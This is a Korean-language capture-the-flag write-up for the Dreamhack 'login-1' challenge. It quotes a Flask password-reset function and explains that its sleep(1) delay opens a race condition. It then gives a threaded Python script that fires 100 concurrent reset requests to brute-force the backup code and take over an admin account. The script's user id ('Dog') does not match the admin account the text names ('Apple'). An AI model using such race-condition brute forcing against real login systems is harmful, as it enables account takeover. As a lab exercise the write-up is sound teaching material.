# login-1

admin 권한을 가진 계정으로 로그인하는 문제이다.

```
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
```   
문제에서 주어진 소스코드를 보면 계정의 비밀번호를 재설정 할 경우 forgot_password()함수에서 backupCode를 확인하고 있다.
여기서 brute force를 막기 위해 1초의 sleep이 이루어지고 시도할 수 있는 횟수가 정해져있다.   

하지만 sleep(1) 함수 때문에 race condition이 발생될 수 있다.   
<br/>

일단 admin 권한을 가진 계정을 찾아야한다.   
/user/<int:useridx> 페이지에서 admin 권한을 가진 계정을 찾을 수 있다.   
image   
Apple 계정이 admin 권한을 가진 것을 확인했다.   
<br/>

이제 race condition 취약점을 이용해 Apple 계정의 비밀번호를 임의로 변경해주면 된다.   
```
import requests
import threading

url = 'http://host1.dreamhack.games:11408/forgot_password'

def crack(i):
    data={
         'userid': 'Dog',
         'newpassword':'1234',
         'backupCode':i
    }
    requests.post(url, data=data)
    print(data['backupCode'])

for i in range(100):
    i = str(i)
    th = threading.Thread(target=crack, args=(i,))
    th.start()
```   

Apple 계정으로 로그인 하고 /admin 페이지에 들어가면 flag를 획득할 수 있다.

